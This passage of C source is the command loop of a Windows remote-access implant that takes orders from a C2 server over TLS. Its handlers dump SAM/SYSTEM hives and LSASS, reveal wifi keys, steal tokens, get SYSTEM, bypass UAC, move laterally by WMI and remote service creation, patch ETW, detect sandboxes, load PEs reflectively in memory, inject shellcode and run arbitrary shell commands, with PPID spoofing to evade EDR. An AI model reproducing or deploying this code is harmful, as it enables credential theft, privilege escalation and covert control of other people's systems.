        }

        /* startup_items â†’ reg query Run keys */
        if (cbCmd >= 13 && strncmp("startup_items", cmd, 13) == 0 &&
            (cbCmd == 13 || cmd[13] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1 & "
                "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1");
            continue;
        }

        /* wifi_passwords â†’ netsh wlan */
        if (cbCmd >= 14 && strncmp("wifi_passwords", cmd, 14) == 0 &&
            (cbCmd == 14 || cmd[14] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "for /f \"tokens=2 delims=:\" %a in "
                "('netsh wlan show profiles ^| findstr Profile') do "
                "netsh wlan show profile name=%a key=clear 2>&1");
            continue;
        }

        /* hashdump → reg save SAM/SYSTEM to temp files
         * reg save requires SeBackupPrivilege.  Run each command separately
         * so the operator sees the real output (success or "Access is denied"),
         * instead of a hardcoded success echo that hides failures. */
        if (cbCmd >= 8 && strncmp("hashdump", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "reg save HKLM\\SAM %TEMP%\\sam.hiv /y 2>&1");
            _shell_exec(pTls, "reg save HKLM\\SYSTEM %TEMP%\\sys.hiv /y 2>&1");
            _send_str(pTls,
                "[*] hashdump: if no errors above, pull with:\n"
                "    download %TEMP%\\sam.hiv\n"
                "    download %TEMP%\\sys.hiv\n"
                "    (Requires SeBackupPrivilege — run getsystem first if denied)");
            continue;
        }

        /* netstat â†’ netstat -ano */
        if (cbCmd >= 7 && strncmp("netstat", cmd, 7) == 0 &&
            (cbCmd == 7 || cmd[7] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "netstat -ano 2>&1");
            continue;
        }

        /* arp â†’ arp -a */
        if (cbCmd >= 3 && strncmp("arp", cmd, 3) == 0 &&
            (cbCmd == 3 || cmd[3] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "arp -a 2>&1");
            continue;
        }

        /* ifconfig â†’ ipconfig /all */
        if (cbCmd >= 8 && strncmp("ifconfig", cmd, 8) == 0 &&
            (cbCmd == 8 || cmd[8] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "ipconfig /all 2>&1");
            continue;
        }

        /* routes â†’ route print */
        if (cbCmd >= 6 && strncmp("routes", cmd, 6) == 0 &&
            (cbCmd == 6 || cmd[6] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, "route print 2>&1");
            continue;
        }

        /* dns_query <host> → nslookup
         * Sanitise: accept only hostname/IP characters [A-Za-z0-9._:-].
         * Reject anything else to prevent shell metacharacter injection
         * (e.g. "8.8.8.8 & whoami" passing verbatim into cmd /c nslookup).
         * The host is also double-quoted in the command string as a second layer. */
        if (cbCmd >= 10 && strncmp("dns_query ", cmd, 10) == 0) {
            char host[256] = {0};
            strncpy(host, cmd + 10, sizeof(host) - 1);

            /* Validate: only alnum, dot, hyphen, colon (IPv6), underscore */
            BOOL safe = TRUE;
            for (int i = 0; host[i]; i++) {
                char c = host[i];
                if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                      (c >= '0' && c <= '9') ||
                      c == '.' || c == '-' || c == ':' || c == '_')) {
                    safe = FALSE; break;
                }
            }
            free(pCmd); pCmd = NULL;
            if (!safe) {
                _send_str(pTls, "[-] dns_query: invalid hostname (only [A-Za-z0-9._:-] allowed)");
            } else {
                char shellcmd[300] = {0};
                _snprintf(shellcmd, sizeof(shellcmd) - 1, "nslookup \"%s\" 2>&1", host);
                _shell_exec(pTls, shellcmd);
            }
            continue;
        }

        /* etw_patch â€” patch EtwEventWrite in this process */
        if (cbCmd >= 9 && strncmp("etw_patch", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            etw_patch();
            _send_str(pTls, "[+] etw_patch: EtwEventWrite patched (RET stub)");
            continue;
        }

        /* dump_lsass â€” MiniDumpWriteDump lsass â†’ %TEMP%\lsass.dmp */
        if (cbCmd >= 10 && strncmp("dump_lsass", cmd, 10) == 0 &&
            (cbCmd == 10 || cmd[10] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_dump_lsass(pTls);
            continue;
        }

        /* token_impersonate <pid> — steal token from <pid> */
        if (cbCmd >= 19 && strncmp("token_impersonate ", cmd, 19) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 19, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_token_impersonate(pTls, args);
            continue;
        }

        /* token_revert — RevertToSelf(), undo token_impersonate / getsystem */
        if (cbCmd >= 12 && strncmp("token_revert", cmd, 12) == 0 &&
            (cbCmd == 12 || cmd[12] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_token_revert(pTls);
            continue;
        }

        /* getsystem — named-pipe impersonation → SYSTEM token */
        if (cbCmd >= 9 && strncmp("getsystem", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_getsystem(pTls);
            continue;
        }

        /* uac_bypass <command> — CMSTPLUA COM elevation */
        if (cbCmd >= 11 && strncmp("uac_bypass ", cmd, 11) == 0) {
            char args[2048] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_uac_bypass(pTls, args);
            continue;
        }

        /* lateral_wmi <host> <command> — WMI Win32_Process.Create */
        if (cbCmd >= 12 && strncmp("lateral_wmi ", cmd, 12) == 0) {
            char args[1024] = {0};
            strncpy(args, cmd + 12, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_lateral_wmi(pTls, args);
            continue;
        }

        /* lateral_sc <host> <command> â€” remote service creation */
        if (cbCmd >= 11 && strncmp("lateral_sc ", cmd, 11) == 0) {
            char args[1024] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_lateral_sc(pTls, args);
            continue;
        }

        /* sandbox_check — native Win32 (no wmic, no child process)
         * Checks: CPU core count, disk size, uptime, debugger presence, VM artefacts.
         * wmic.exe was deprecated in Win10 21H1 and removed in Win11 24H2. */
        if (cbCmd >= 13 && strncmp("sandbox_check", cmd, 13) == 0 &&
            (cbCmd == 13 || cmd[13] == ' ')) {
            free(pCmd); pCmd = NULL;
            {
                char buf[1024] = {0};
                int off = 0;

                /* CPU core count */
                SYSTEM_INFO si = {0};
                GetNativeSystemInfo(&si);
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[CPU]     Processors : %lu\n", si.dwNumberOfProcessors);

                /* Total physical disk size (first fixed drive) */
                ULARGE_INTEGER freeBytes, totalBytes, totalFreeBytes;
                if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFreeBytes))
                    off += _snprintf(buf + off, sizeof(buf) - off - 1,
                        "[DISK]    C:\\ total  : %llu GB\n",
                        (unsigned long long)(totalBytes.QuadPart / (1024*1024*1024)));

                /* Uptime */
                ULONGLONG ms   = GetTickCount64();
                ULONGLONG days = ms / 86400000ULL;
                ULONGLONG hrs  = (ms % 86400000ULL) / 3600000ULL;
                ULONGLONG mins = (ms % 3600000ULL)  / 60000ULL;
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[UPTIME]  %llud %lluh %llum\n", days, hrs, mins);

                /* Debugger */
                BOOL dbg = IsDebuggerPresent();
                BOOL rdbg = FALSE;
                CheckRemoteDebuggerPresent(GetCurrentProcess(), &rdbg);
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[DEBUGGER] local=%s remote=%s\n",
                    dbg  ? "YES" : "no",
                    rdbg ? "YES" : "no");

                /* VM / sandbox heuristic: check for common VM registry keys */
                const char *vmKeys[] = {
                    "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                    "SOFTWARE\\VMware, Inc.\\VMware Tools",
                    "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                };
                const char *vmVals[] = { "Identifier", "InstallPath", "InstallDir" };
                BOOL vm = FALSE;
                for (int vi = 0; vi < 3 && !vm; vi++) {
                    HKEY hk = NULL;
                    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[vi], 0, KEY_READ, &hk)
                            == ERROR_SUCCESS) {
                        vm = TRUE;
                        RegCloseKey(hk);
                    }
                    (void)vmVals[vi];
                }
                off += _snprintf(buf + off, sizeof(buf) - off - 1,
                    "[VM]      artefacts=%s\n", vm ? "YES" : "no");

                buf[off] = '\0';
                _send_str(pTls, buf);
            }
            continue;
        }

        /* cat <file> â†’ type */
        if (cbCmd >= 4 && strncmp("cat ", cmd, 4) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 4, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 8] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1, "type \"%s\" 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* mkdir <path> â†’ mkdir */
        if (cbCmd >= 6 && strncmp("mkdir ", cmd, 6) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 6, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 10] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1, "mkdir \"%s\" 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* rm <path> â†’ del /f /q or rmdir /s /q */
        if (cbCmd >= 3 && strncmp("rm ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 48] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "if exist \"%s\\\" (rmdir /s /q \"%s\" 2>&1) "
                "else (del /f /q \"%s\" 2>&1)",
                path, path, path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_files <path> <pattern> â†’ dir /s /b */
        if (cbCmd >= 11 && strncmp("find_files ", cmd, 11) == 0) {
            char fpath[MAX_PATH] = {0};
            char fpat[128]       = {0};
            sscanf(cmd + 11, "%259s %127s", fpath, fpat);
            char shellcmd[MAX_PATH + 160] = {0};
            if (fpat[0])
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\\%s\" 2>&1", fpath, fpat);
            else
                _snprintf(shellcmd, sizeof(shellcmd) - 1,
                    "dir /s /b \"%s\" 2>&1", fpath);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* file_hash <path> â†’ certutil -hashfile SHA256 */
        if (cbCmd >= 10 && strncmp("file_hash ", cmd, 10) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 10, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 32] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "certutil -hashfile \"%s\" SHA256 2>&1", path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* tail <file> [n] â†’ powershell Get-Content -Tail */
        if (cbCmd >= 5 && strncmp("tail ", cmd, 5) == 0) {
            char path[MAX_PATH] = {0};
            int  n = 20;
            sscanf(cmd + 5, "%259s %d", path, &n);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command \"Get-Content '%s' -Tail %d\" 2>&1",
                path, n);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* write_file <path> <content> â†’ echo > file */
        if (cbCmd >= 11 && strncmp("write_file ", cmd, 11) == 0) {
            char path[MAX_PATH] = {0};
            const char *rest = cmd + 11;
            /* first token is path, remainder is content */
            size_t pi = 0;
            while (*rest && *rest != ' ' && pi < MAX_PATH - 1) path[pi++] = *rest++;
            if (*rest == ' ') rest++;
            char shellcmd[MAX_PATH + 4096] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "powershell -NoProfile -Command "
                "\"Set-Content -Path '%s' -Value '%s'\" 2>&1",
                path, rest);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* chmod <mode> <path> â†’ icacls (Windows approximation) */
        if (cbCmd >= 6 && strncmp("chmod ", cmd, 6) == 0) {
            char mode[16] = {0}, path[MAX_PATH] = {0};
            sscanf(cmd + 6, "%15s %259s", mode, path);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "icacls \"%s\" 2>&1 & echo [!] chmod mapped to icacls on Windows",
                path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_writable <path> â†’ icacls + findstr */
        if (cbCmd >= 14 && strncmp("find_writable ", cmd, 14) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 14, sizeof(path) - 1);
            char shellcmd[MAX_PATH + 64] = {0};
            _snprintf(shellcmd, sizeof(shellcmd) - 1,
                "icacls \"%s\" /t 2>&1 | findstr /i \"(W) (M) (F) Everyone Users\"",
                path);
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls, shellcmd);
            continue;
        }

        /* find_suid → Windows has no SUID; enumerate services via sc query
         * (wmic service was removed from Windows 11 24H2; sc query is always present) */
        if (cbCmd >= 9 && strncmp("find_suid", cmd, 9) == 0 &&
            (cbCmd == 9 || cmd[9] == ' ')) {
            free(pCmd); pCmd = NULL;
            _shell_exec(pTls,
                "echo [*] No SUID on Windows. Services with non-Windows paths: & "
                "sc query state= all 2>&1 | findstr /i \"SERVICE_NAME\" & "
                "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /s /v ImagePath"
                " 2>&1 | findstr /i /v \"system32 syswow64 DriverStore\"");
            continue;
        }

        /* ── bg <cmd> — fire-and-forget background job ──────────────────── */
        if (cbCmd >= 3 && strncmp("bg ", cmd, 3) == 0) {
            char args[1024] = {0};
            strncpy(args, cmd + 3, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _bg_shell_exec(pTls, args);
            continue;
        }

        /* ── jobs — list background jobs ─────────────────────────────────── */
        if ((cbCmd == 4 && strncmp("jobs", cmd, 4) == 0) ||
            (cbCmd >= 5 && strncmp("jobs ", cmd, 5) == 0)) {
            free(pCmd); pCmd = NULL;
            _list_jobs(pTls);
            continue;
        }

        /* ── job_output <id> — fetch completed job output ────────────────── */
        if (cbCmd >= 11 && strncmp("job_output ", cmd, 11) == 0) {
            char args[16] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _job_output(pTls, args);
            continue;
        }

        /* ── job_kill <id> — terminate a running background job ──────────── */
        if (cbCmd >= 9 && strncmp("job_kill ", cmd, 9) == 0) {
            char args[16] = {0};
            strncpy(args, cmd + 9, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _job_kill(pTls, args);
            continue;
        }

        /* ── Not-supported stubs ─────────────────────────────────────────── */
        /* Python-agent-only features: return a clear error rather than  */
        /* hanging on a recv_msg() that will never get a reply.          */

#define _NS(verb, vlen) \
        if (cbCmd >= (vlen) && strncmp((verb), cmd, (vlen)) == 0 && \
            (cbCmd == (vlen) || cmd[(vlen)] == ' ')) { \
            free(pCmd); pCmd = NULL; \
            _not_supported(pTls, (verb)); \
            continue; \
        }

        /* ── stage_load — receive a PE from C2 and run it in-memory ─────── */
        /*
         * Protocol:
         *   C2 sends: "stage_load"
         *   Agent replies: "STAGE_READY"
         *   C2 sends: raw PE bytes as one TLS frame (tls_send_msg)
         *   Agent: maps the PE via the reflective loader blob in a new thread,
         *          replies "[+] stage_load: running" and returns to the loop.
         *
         * No file is written to disk.  The PE runs inside the current process.
         * The loader calls AgentRun() in the new image — a second C2 loop
         * starts on a background thread.  Both the stager loop and the loaded
         * agent run concurrently; the stager should then call "exit" to clean up.
         */
        if (cbCmd >= 10 && strncmp("stage_load", cmd, 10) == 0 &&
            (cbCmd == 10 || cmd[10] == ' ')) {
            free(pCmd); pCmd = NULL;

            /* Tell C2 we are ready to receive the PE */
            _send_str(pTls, "STAGE_READY");

            /* Receive the PE bytes as a single TLS frame */
            BYTE  *pPE2  = NULL;
            DWORD  cbPE2 = 0;
            if (!tls_recv_msg(pTls, &pPE2, &cbPE2) || cbPE2 < 64) {
                if (pPE2) free(pPE2);
                _send_str(pTls, "[-] stage_load: recv failed");
                continue;
            }

            /* Verify MZ header */
            if (pPE2[0] != 'M' || pPE2[1] != 'Z') {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: not a valid PE");
                continue;
            }

            /* Parse AgentRun RVA from PE export table */
            /* _pe_find_export is static in inject.c — duplicate a minimal scan
             * using the PE headers directly rather than calling across TU. */
            DWORD agentRva = 0;
            {
                IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)pPE2;
                if (cbPE2 > (DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64)) {
                    IMAGE_NT_HEADERS64 *nth =
                        (IMAGE_NT_HEADERS64 *)((BYTE *)pPE2 + dos->e_lfanew);
                    if (nth->OptionalHeader.Magic == 0x020B) {
                        DWORD expRVA = nth->OptionalHeader.DataDirectory[0].VirtualAddress;
                        IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nth);
                        WORD  nSec = nth->FileHeader.NumberOfSections;
                        /* RVA → file offset */
                        DWORD expOff = 0;
                        for (WORD si = 0; si < nSec; si++) {
                            if (expRVA >= sec[si].VirtualAddress &&
                                expRVA <  sec[si].VirtualAddress + sec[si].Misc.VirtualSize) {
                                expOff = sec[si].PointerToRawData +
                                         (expRVA - sec[si].VirtualAddress);
                                break;
                            }
                        }
                        if (expOff && expOff + sizeof(IMAGE_EXPORT_DIRECTORY) <= cbPE2) {
                            IMAGE_EXPORT_DIRECTORY *expDir =
                                (IMAGE_EXPORT_DIRECTORY *)((BYTE *)pPE2 + expOff);
                            DWORD nNames = expDir->NumberOfNames;
                            DWORD nameTableRVA = expDir->AddressOfNames;
                            DWORD addrTableRVA = expDir->AddressOfFunctions;
                            DWORD ordTableRVA  = expDir->AddressOfNameOrdinals;
                            /* RVA → raw-file-offset scan */
                            #define _R2F(rva) _stage_rva2off((rva), sec, nSec)
                            DWORD nOff = _R2F(nameTableRVA);
                            DWORD aOff = _R2F(addrTableRVA);
                            DWORD oOff = _R2F(ordTableRVA);
                            if (nOff && aOff && oOff) {
                                for (DWORD ni = 0; ni < nNames; ni++) {
                                    DWORD nRva;
                                    memcpy(&nRva, (BYTE *)pPE2 + nOff + ni*4, 4);
                                    DWORD nOff2 = _R2F(nRva);
                                    if (!nOff2 || nOff2 >= cbPE2) continue;
                                    if (strcmp((char *)((BYTE *)pPE2 + nOff2),
                                               "AgentRun") != 0) continue;
                                    WORD ord;
                                    memcpy(&ord, (BYTE *)pPE2 + oOff + ni*2, 2);
                                    memcpy(&agentRva, (BYTE *)pPE2 + aOff + ord*4, 4);
                                    break;
                                }
                            }
                            #undef _R2F
                        }
                    }
                }
            }

            if (!agentRva) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: AgentRun export not found");
                continue;
            }

            /* Resolve kernel32 API pointers for the loader */
            HMODULE hK32s = GetModuleHandleA("kernel32.dll");
            typedef LPVOID (WINAPI *pVA2_t)(LPVOID,SIZE_T,DWORD,DWORD);
            typedef BOOL   (WINAPI *pFIC2_t)(HANDLE,LPCVOID,SIZE_T);
            typedef HMODULE(WINAPI *pLL2_t)(LPCSTR);
            typedef FARPROC(WINAPI *pGP2_t)(HMODULE,LPCSTR);
            typedef HANDLE (WINAPI *pCT2_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
                                             LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
            typedef BOOL   (WINAPI *pCH2_t)(HANDLE);
            pVA2_t  pVA2  = (pVA2_t) GetProcAddress(hK32s,"VirtualAlloc");
            pFIC2_t pFIC2 = (pFIC2_t)GetProcAddress(hK32s,"FlushInstructionCache");
            pLL2_t  pLL2  = (pLL2_t) GetProcAddress(hK32s,"LoadLibraryA");
            pGP2_t  pGP2  = (pGP2_t) GetProcAddress(hK32s,"GetProcAddress");
            pCT2_t  pCT2  = (pCT2_t) GetProcAddress(hK32s,"CreateThread");
            pCH2_t  pCH2  = (pCH2_t) GetProcAddress(hK32s,"CloseHandle");

            if (!pVA2 || !pFIC2 || !pLL2 || !pGP2 || !pCT2 || !pCH2) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: kernel32 resolution failed");
                continue;
            }

            /* Build RflData for in-process reflective load */
            extern char g_key_path[];
            RflData rfdS;
            ZeroMemory(&rfdS, sizeof(rfdS));
            rfdS.rawSize              = cbPE2;
            rfdS.agentRunRva          = agentRva;
            rfdS.gKeyPathOffset       = 0;    /* in-process: g_key_path already set */
            rfdS.gKeyPathSize         = 0;
            strncpy(rfdS.keyPath, g_key_path, sizeof(rfdS.keyPath) - 1);
            rfdS.pVirtualAlloc         = pVA2;
            rfdS.pFlushInstructionCache= pFIC2;
            rfdS.pLoadLibraryA         = pLL2;
            rfdS.pGetProcAddress       = pGP2;
            rfdS.pCreateThread         = pCT2;
            rfdS.pCloseHandle          = pCH2;

            /* Allocate RW region in current process: [loader | RflData | PE] */
            SIZE_T cbLs  = (SIZE_T)S_RFL_LOADER_SIZE;
            SIZE_T cbRs  = sizeof(RflData);
            SIZE_T cbTs  = cbLs + cbRs + (SIZE_T)cbPE2;
            PVOID  pRemS = NULL;
            NTSTATUS nsS = SC_NtAllocateVirtualMemory(
                GetCurrentProcess(), &pRemS, 0, &cbTs,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            if (!NT_SUCCESS(nsS)) {
                free(pPE2);
                _send_str(pTls, "[-] stage_load: alloc failed");
                continue;
            }

            rfdS.pRawPE = (unsigned char *)((BYTE *)pRemS + cbLs + cbRs);

            /* Build flat buffer and write into the allocation */
            memcpy((BYTE *)pRemS,            s_rfl_loader, cbLs);
            memcpy((BYTE *)pRemS + cbLs,     &rfdS,        cbRs);
            memcpy((BYTE *)pRemS + cbLs + cbRs, pPE2,      cbPE2);
            free(pPE2);

            /* Flip loader region RW → RX */
            PVOID  pBS = pRemS;
            SIZE_T cPS = cbLs;
            ULONG  oPS = 0;
            SC_NtProtectVirtualMemory(GetCurrentProcess(), &pBS, &cPS,
                                      PAGE_EXECUTE_READ, &oPS);

            /* Launch loader in a new thread — it maps + starts AgentRun */
            PVOID  pArgS  = (BYTE *)pRemS + cbLs;
            HANDLE hThS   = NULL;
            NTSTATUS nsT  = SC_NtCreateThreadEx(
                &hThS, THREAD_ALL_ACCESS, NULL,
                GetCurrentProcess(), pRemS, pArgS,
                THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
                0, 0, 0, NULL);

            if (NT_SUCCESS(nsT) && hThS) {
                SC_NtClose(hThS);
                _send_str(pTls, "[+] stage_load: PE loaded in-memory, AgentRun started");
            } else {
                _send_str(pTls, "[-] stage_load: thread creation failed");
            }
            continue;
        }

        _NS("screenshot",         10)
        _NS("screenshot_region",  17)
        _NS("screenshot_timelapse", 21)
        _NS("screenrecord",       12)
        _NS("screen_stream",      13)
        _NS("webcam",              6)
        _NS("record",              6)
        _NS("mic_level",           9)
        _NS("keylog_start",       12)
        _NS("keylog_dump",        11)
        _NS("keylog_stop",        11)
        _NS("browser_history",    15)
        _NS("browser_creds",      13)
        /* inject_shellcode <pid> <hex> — alias for "inject" */
        if (cbCmd >= 17 && strncmp("inject_shellcode ", cmd, 17) == 0) {
            char args[65600] = {0};
            strncpy(args, cmd + 17, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            inject_shellcode(pTls, args);
            continue;
        }

        /* dll_inject <pid> — alias for "migrate" (reflective PE injection) */
        if (cbCmd >= 11 && strncmp("dll_inject ", cmd, 11) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;
        }
        _NS("reverse_shell",      13)
        _NS("socks5",              6)
        _NS("portfwd",             7)
        /* uac_bypass is now implemented — entry removed from _NS stubs */
        _NS("cred_vault",         10)
        _NS("ssh_harvest",        11)
        _NS("sudo_sniff",         10)
        _NS("sudo_sniff_read",    15)
        _NS("sudo_sniff_clean",   16)

        /* clip_watch — poll clipboard for change (up to 30 s) */
        if (cbCmd >= 10 && strncmp("clip_watch", cmd, 10) == 0 &&
            (cbCmd == 10 || cmd[10] == ' ')) {
            free(pCmd); pCmd = NULL;
            _handle_clip_watch(pTls);
            continue;
        }

        _NS("notify",              6)

        /* open_url <url> — ShellExecute default browser */
        if (cbCmd >= 9 && strncmp("open_url ", cmd, 9) == 0) {
            char args[2048] = {0};
            strncpy(args, cmd + 9, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_open_url(pTls, args);
            continue;
        }

        _NS("play_sound",         10)

        /* set_wallpaper <path> — SystemParametersInfoA SPI_SETDESKWALLPAPER */
        if (cbCmd >= 14 && strncmp("set_wallpaper ", cmd, 14) == 0) {
            char args[MAX_PATH] = {0};
            strncpy(args, cmd + 14, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_set_wallpaper(pTls, args);
            continue;
        }

        /* mouse_move <x> <y> — SetCursorPos */
        if (cbCmd >= 11 && strncmp("mouse_move ", cmd, 11) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 11, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_mouse_move(pTls, args);
            continue;
        }

        /* type_keys <text> — SendInput keystroke simulation */
        if (cbCmd >= 11 && strncmp("type_keys ", cmd, 10) == 0) {
            char args[2048] = {0};
            strncpy(args, cmd + 10, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_type_keys(pTls, args);
            continue;
        }

        _NS("forkbomb",            8)
        _NS("living_off_land",    15)
        _NS("zip_download",       12)
        _NS("zip_upload",         10)

        /* run_psh <cmd> — execute PowerShell, capture output */
        if (cbCmd >= 8 && strncmp("run_psh ", cmd, 8) == 0) {
            char args[4096] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_run_psh(pTls, args);
            continue;
        }

        _NS("run_python",          10)
        _NS("pty_shell",           9)
        _NS("load_extension",     14)
        _NS("unload_extension",   16)
        _NS("irb",                 3)
        /* getsystem is now implemented — entry removed from _NS stubs */
        _NS("kiwi",                4)

#undef _NS

        /* â”€â”€ Shell fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
        char *cmdCopy = (char *)malloc(cbCmd + 1);
        if (cmdCopy) {
            memcpy(cmdCopy, cmd, cbCmd);
            cmdCopy[cbCmd] = '\0';
        }
        free(pCmd); pCmd = NULL;
        if (cmdCopy) {
            _shell_exec(pTls, cmdCopy);
            free(cmdCopy);
        }
    }

    if (pCmd) free(pCmd);
}


/* â”€â”€ _send_str â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _send_str(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg) msg = "";
    size_t len = strlen(msg);
    /* Acquire the TLS send lock so background job threads cannot interleave
     * their "job done" notifications with in-progress handler responses.   */
    if (g_cs_init) EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)(len ? msg : " "), (DWORD)(len ? len : 1));
    if (g_cs_init) LeaveCriticalSection(&g_tls_cs);
}


/* â”€â”€ _not_supported â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _not_supported(TLS_CONTEXT *pTls, const char *verb)
{
    char buf[128];
    _snprintf(buf, sizeof(buf) - 1,
        "[-] %s: not supported by C agent (Python agent only)", verb);
    _send_str(pTls, buf);
}


/* â”€â”€ _shell_exec â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */

void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    /*
     * CreateProcess + anonymous pipe, no _popen.
     *
     * Evasion:
     *   1. CREATE_NO_WINDOW  — no console window created or visible.
     *   2. PPID spoof via UpdateProcThreadAttribute(PARENT_PROCESS) — the
     *      child appears in EDR process trees as a child of explorer.exe.
     *      Graceful fallback if explorer.exe cannot be opened.
     *   3. Pipe read end not inherited; write end closed after CreateProcess
     *      so ReadFile returns naturally on child exit (EOF).
     */

    /* ── Build "cmd /c <command>" ────────────────────────────────────── */
